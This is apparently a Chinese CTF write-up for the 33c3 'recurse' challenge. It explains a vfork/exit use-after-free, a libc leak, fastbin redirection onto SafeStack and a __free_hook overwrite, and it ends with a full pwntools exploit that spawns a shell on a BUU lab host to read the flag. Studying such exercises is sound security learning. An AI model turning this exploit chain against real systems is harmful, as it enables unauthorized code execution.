+++
title = "recurse_33c3_2016 WP"
date = "2026-04-16"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
# recurse_33c3_2016 WP
保护:
```text
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: PIE enabled
```

---

## 一、程序逻辑

程序启动后先问名字，然后进入一个菜单:

```text
welcome to recurse
what's your name?
Hi, <name>
What would you like to do?
1) recurse
2) recurse!!!
3) recurse?!
4) iterate
```

菜单对应逻辑大致是：

- `1) recurse`
  递归调用当前 challenge 对象
- `2) recurse!!!`
  新建一个 challenge 对象，再递归进去
- `3) recurse?!`
  `vfork()` 一个子进程，然后 `execl("/proc/self/exe", "fork", name, NULL)`
- `4) iterate`
  什么都不做，继续循环
- `>4`
  返回上一层

这个题的关键不是传统栈溢出，而是 `C++ 对象 + vfork + destructor + SafeStack` 组合出的 UAF。

---

## 二、核心漏洞点

### 1. `option 3` 的危险行为

`3) recurse?!` 最终会走到类似下面的逻辑：

```c
pid = vfork();
if (pid == 0) {
    execl("/proc/self/exe", "fork", current_name, NULL);
    err(1, ...);   // 如果 execl 失败，这里会 exit()
}
waitpid(pid, ...);
```

问题在于：

- `vfork()` 之后，子进程和父进程共享地址空间，直到子进程 `execve` 或 `_exit`
- 这里如果 `execl()` 失败，就会进入 `err()`
- `err()` 内部会调用 `exit()`
- `exit()` 会执行全局对象析构函数

这就把**父进程还在用的全局 C++ 对象提前析构掉了**

也就是：

- 全局对象被 `free`
- 父进程继续运行
- 形成 **use-after-free**

---

## 三、为什么可以让 `execl` 失败

这个题里 `execl` 的第三个参数是当前字符串内容。

只要把当前字符串做得足够大，`execve` 处理参数时就会失败，于是会走到 `err()->exit()` 这条危险路径。

原始利用里用的是一个非常长的名字：

```python
b"A" * (4095 * 34 - 61)
```

这样就能稳定触发 `execl` 失败，从而把全局对象打成 UAF。

---

## 四、SafeStack 对利用的影响

这题开启了 clang 的 `SafeStack`。

它会把：

- 返回地址等“安全数据”放在 safe stack
- 普通局部对象、字符串对象等放在 unsafe stack

这意味着：

1. 传统覆盖返回地址的打法不适合
2. 但是 unsafe stack 和 libc 的相对位置是稳定的
3. 题目可以通过 UAF + 堆风水 + SafeStack 固定偏移，最终把堆分配导向 unsafe stack

这也是这题最核心的利用思路。

---

## 五、利用思路总览

整体利用链是：

1. 进入递归，准备一批特定大小的 `std::string`
2. 触发 `vfork + err + exit`，把全局 challenge 对象析构，制造 UAF
3. 继续申请堆块，把被 free 的内容重新占用
4. 通过大 chunk 泄漏 unsorted bin 指针，拿到 libc
5. 由 libc 推出 SafeStack 的目标地址
6. 伪造 fastbin 链，把下一次分配劫持到 SafeStack 上
7. 再次改写字符串对象的指针，让它指向 `__free_hook - 8`
8. 写入 `sh;#` 和 `system`
9. 触发 `free`，等价执行：

```c
system("sh;#")
```

10. 拿到 shell 后读 flag

---

## 六、libc 泄漏

UAF 之后，利用一批分配把被释放的全局对象内容重新布置。

接着申请一个较大的 chunk，让它进入 unsorted bin，再从程序打印的字符串内容里拿到 libc 指针。

在 BUU 这个环境里，泄漏对应的是 `glibc 2.23` 的 unsorted bin 指针，使用的偏移是：

```python
libc_leak_off = 0x3c4b78
```

所以：

```python
libc_base = leaked_addr - 0x3c4b78
```

我实际打出来的 libc 基址类似：

```text
0x7fbb628d7000
```

---

## 七、SafeStack 偏移

原始 33c3 远端环境和 BUU 的环境在 SafeStack 相对 libc 的偏移上不一样。

这个题在 BUU 上稳定可用的是：

```python
safestack = libc_base - 0x408
```

不是原始 writeup 里那组远端偏移。

这一步如果错了，后面把 fastbin 打到栈上的阶段就会直接崩。

---

## 八、堆利用阶段

利用中先准备一些 `0x51` 大小的字符串对象：

```python
for _ in range(20):
    enter(io, b"X" * 0x51)
for _ in range(20):
    leave(io)
```

这一步的作用是：

- 在递归层里留下若干满足条件的字符串对象
- 后面把 fastbin chunk 打到 SafeStack 上时，需要伪造的对象能通过 size 检查

之后通过一组固定分配：

```python
for _ in range(8):
    enter(io, b"A" * 48)
enter(io, b"C" * 128)
for _ in range(9):
    leave(io)
```

把 unsorted bin 指针泄出来。

---

## 九、把 fastbin 打到 SafeStack

泄漏 libc 后，先把某次分配的目标改成：

```python
p64(safestack)
```

然后继续布置若干小 chunk：

```python
enter(io, b"D" * 9)
enter(io, b"D" * 9)
enter(io, b"D" * 9)
enter(io, b"D" * 9)
enter(io, b"X" * 15)
enter(io, b"C" * 81)

for _ in range(7):
    enter(io, b"X" * 48)
```

再伪造一些 chunk 元数据：

```python
enter(io, p64(0x30) + b"\x30")
enter(io, p64(0x30) + b"\x30")
enter(io, p64(0x60))
enter(io, p64(0x21))
```

最后：

```python
enter(io, b"F" * 40 + b"\xa0")
```

这一分配会落到 SafeStack 上，并进一步改写上层字符串对象的指针。

---

## 十、改写 `__free_hook`

当字符串对象指针已经可控后，把它改到：

```python
__free_hook - 8
```

对应 BUU 这边 `glibc 2.23` 的偏移：

```python
free_hook_off = 0x3c67a8
system_off = 0x45390
```

写入内容：

```python
p64(libc_base + free_hook_off - 8) * 5 + p64(0x30)
```

然后连续 `leave()` 若干次，让控制流回到合适的位置，再送最终 payload：

```python
b"sh;#".ljust(8, b"A") + p64(libc_base + system_off)
```

此时会把：

- `__free_hook` 改成 `system`
- 待 free 的字符串内容开头变成 `"sh;#"`

于是下一次 free 时就变成：

```c
system("sh;#")
```

从而起 shell。

---

## 十一、为什么读 flag 的命令前面要补分号

实际远端 shell 切换后，会吞掉后续输入的第一个字节。

所以直接发：

```sh
cat flag
```

会变成：

```sh
at flag
```

因此脚本里用的是：

```python
b";/bin/cat flag; /bin/cat /flag"
```

这样即使丢掉第一个字节，也还能正确执行。

---

## 十二、最终 exp

```python
from pwn import *
import re
import struct
import sys

context.clear(arch="amd64", os="linux")
context.log_level = "info"

HOST = "node5.buuoj.cn"
PORT = 26682

def start():
    return remote(HOST, PORT)

def enter(io, name=b"AAAA"):
    io.recvuntil(b"iterate")
    io.sendline(b"2")
    io.recvuntil(b"name?")
    io.sendline(name)

def leave(io):
    io.recvuntil(b"iterate")
    io.sendline(b"6")

def trigger_uaf(io):
    enter(io, b"A" * (4095 * 34 - 61))
    for _ in range(33):
        io.recvn(4095)

    io.recvuntil(b"iterate")
    io.sendline(b"3")
    leave(io)

io = start()

libc_leak_off = 0x3C4B78
free_hook_off = 0x3C67A8
system_off = 0x45390

io.recvuntil(b"name?")
io.sendline(b"A" * 16)

io.recvuntil(b"iterate")
io.sendline(b"1")
io.recvuntil(b"name?")
io.sendline(b"A" * 400)

for _ in range(20):
    enter(io, b"X" * 0x51)
for _ in range(20):
    leave(io)

trigger_uaf(io)

iter_cnt = 8
for _ in range(iter_cnt):
    enter(io, b"A" * 48)
enter(io, b"C" * 128)
for _ in range(iter_cnt + 1):
    leave(io)

leak = io.recvuntil(b"iterate")
leak_off = leak.find(b"\x7f\x00\x00") - 5
libc_base = struct.unpack("<Q", leak[leak_off:leak_off + 8])[0] - libc_leak_off

safestack = libc_base - 0x408

io.sendline(b"1")
io.recvuntil(b"name?")
io.sendline(p64(safestack))

enter(io, b"D" * 9)
enter(io, b"D" * 9)
enter(io, b"D" * 9)
enter(io, b"D" * 9)
enter(io, b"X" * 15)
enter(io, b"C" * 81)

for _ in range(7):
    enter(io, b"X" * 48)

enter(io, p64(0x30) + b"\x30")
enter(io, p64(0x30) + b"\x30")
enter(io, p64(0x60))
enter(io, p64(0x21))

enter(io, b"F" * 40 + b"\xa0")

io.recvuntil(b"iterate")
io.sendline(b"1")
io.recvuntil(b"name?")
io.sendline(p64(libc_base + free_hook_off - 8) * 5 + p64(0x30))

leave(io)
leave(io)
leave(io)
leave(io)

io.recvuntil(b"Hi, ")
io.sendline(b"1")
io.sendline(b"sh;#".ljust(8, b"A") + p64(libc_base + system_off))
io.sendline(b"8")
io.sendline(b";/bin/cat flag; /bin/cat /flag")

data = io.recvrepeat(2)
m = re.search(rb"flag\{[^}]+\}", data)
if m:
    sys.stdout.buffer.write(m.group(0) + b"\n")
else:
    sys.stdout.buffer.write(data)

io.close()
```

---

## 十三、总结

这题的重点不是传统栈溢出，而是：

- `vfork()` 后错误地走到 `exit()`
- 全局 C++ 对象被提前析构
- 形成 UAF
- 再结合 `SafeStack` 的固定相对偏移
- 最终实现 `__free_hook -> system`

一句话概括就是：

```text
vfork/exit 导致全局对象 UAF + 堆风水泄漏 libc + 劫持到 SafeStack + __free_hook getshell
```
